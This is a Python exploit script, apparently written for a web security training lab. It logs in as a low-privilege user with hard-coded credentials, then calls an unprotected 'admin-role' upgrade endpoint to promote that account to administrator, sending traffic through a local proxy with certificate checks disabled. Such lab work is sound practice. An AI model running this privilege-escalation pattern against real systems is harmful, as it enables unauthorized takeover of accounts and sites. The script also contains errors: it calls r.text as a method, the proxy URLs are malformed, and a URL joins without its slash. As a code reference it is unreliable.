import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http//127.0.0.1:8080', 'https':'https//127.0.0.1:8080'}

def promote_to_admin(s, url):
    #Logging in as the user
    login_url = url + '/login'
    login_data = {'username':'weiner', 'password':'peter',}
    r = s.post(login_url, data=login_data, verify=False, proxies=proxies)
    res = r.text()    
    if 'Log out' in res:
        print('(+) Successfully Logged in as user weiner ')        
        #Exploite the access control vulnerability to promote our user to admin user 
        admin_role_url = url + 'admin-role?username=weiner&action=upgrade'
        r = s.get(admin_role_url, verify=False, proxies=proxies)
        res = r.text()
        if 'admin-panel' in res:
            print('(+) Successfully promoted user to admin  ')
        else:
            print('(+) Failed to promote the user to admin ')
            sys.exit(-1)
    else:
        print('(+) Failed to log in as user weiner ')
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print(" (+) Usage: %s <url>" % sys.argv [0])
        print(" (+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.session()
    url = sys.argv[1]
    promote_to_admin(s, url)

if __name__ == '__main__':
    main()